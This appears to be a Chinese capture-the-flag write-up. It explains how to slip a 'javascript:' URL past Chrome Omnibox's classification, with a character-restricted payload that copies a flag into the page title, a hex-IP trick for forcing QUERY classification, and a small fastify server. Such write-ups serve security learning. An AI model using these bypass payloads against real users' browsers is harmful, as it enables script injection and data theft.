# 给钱不要

查看网站前端源码可知，按下 `Go` 按钮时，进行了对 `location.href` 的赋值操作。这是一个危险操作，因为会自动执行 `javascript:` 标签语句。

对此，`XSSBOT` 的防范是使用 `Chrome Omnibox` 进行安全检查。

根据提示，阅读 `omnibox` 有关源码，在 [`autocomplete_input.cc`](https://github.com/chromium/chromium/blob/main/components/omnibox/browser/autocomplete_input.cc) 中找到如下的代码：

```cpp
  // Treat javascript: scheme queries followed by things that are unlikely to
  // be code as UNKNOWN, rather than script to execute (URL).
  if (base::EqualsCaseInsensitiveASCII(parsed_scheme_utf8,
                                       url::kJavaScriptScheme) &&
      RE2::FullMatch(base::UTF16ToUTF8(text), "(?i)javascript:([^;=().\"]*)")) {
    return metrics::OmniboxInputType::UNKNOWN;
  }
```

可以看到，如果 `javascript:` 语句中不包含 `;=()."`，就不会被识别为 `url`，而是会识别为 `unknown`。那么，如何不使用这些字符，而又能执行我们想要的操作呢？

- `"` 可以用 `'` 直接代替
- `a.b` 可以用 `a['b']` 代替
- 赋值可以用 `Object['assign']` 代替
- 函数调用可以用 `apply` + [模板字面量](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates) 代替

## Flag 2

可以看到 `XSSBOT` 直接将 Flag 2 放在了 `<p class="flag"></p` 标签中，而我们是可以得到按下 `Go` 按钮后的页面标题的。所以我们只要将页面标题设置为包含 Flag 2 的标签的内容即可。

使用的代码为：

```javascript
javascript: Object['assign']['apply']`${[document, { 'title': document['getElementsByClassName']`flag`[0]['innerText'] }]}`
```

## Flag 1

> 从做题情况来看，这道题大家基本上都是先拿到 Flag 2，然后才拿到 Flag 1。

Flag 2 需要的安全等级为 `safe`，但是 Flag 1 需要的安全等级为 `very safe`，也即只有被识别为 `query` 才可以通过。

### 失败尝试一

部署了一个返回标题为所需标题的[网站](https://geekgame-2022-prob06.gabriel-wu.com/)，在输入框中输入 `https://3 @geekgame-2022-prob06.gabriel-wu.com/` 可以实现跳转，但由于去除前缀后的 `3 @geekgame-2022-prob06.gabriel-wu.com/` 识别为 `unknown` 而不是 `query`，所以虽然成功跳转，标题也符合要求，但无法拿到 Flag 1。

> 第二阶段提示后完成。

提示要把**任意** IP 地址解析成 `QUERY`，但目前只能做到把第三位为 `0` 的 IP 地址解析成 `QUERY`。方法是：对于 `x.y.0.z` 这样的 IP 地址，可以只输入 `x.y.z`，然后浏览器会自动补全为 `x.y.0.z`。

成功实现了把任意 IP 地址解析成 `QUERY` 的目标，方法是把后两位合并写成十六进制。

在自己的服务器上部署了如下的服务：

```javascript
// Require the framework and instantiate it
const fastify = require('fastify')({ logger: true })

// Declare a route
fastify.get('/:name', async (req, res) => {
  const { name = '' } = req.params
  res.type('text/html').status(200).send(`<doctype html><html><title>GIVE-ME-FLAG-1 #=_= @!+!@ ^~^ %[*.*]%</title><body><h1>hello ${name}</h1></body></html>`)
})

// Run the server!
const start = async () => {
  try {
    await fastify.listen({ host: '0.0.0.0', port: 8080 })
  } catch (err) {
    fastify.log.error(err)
    process.exit(1)
  }
}
start()
```

然后让 `XSSBOT` 访问 `http://abc.xyz.0xuvwz:8080/data`*（隐去了服务器具体 IP） 即可拿到 Flag 1（`flag{kfc-FkxQs://vwo.50.Yuan/geini-Flag1}`）。
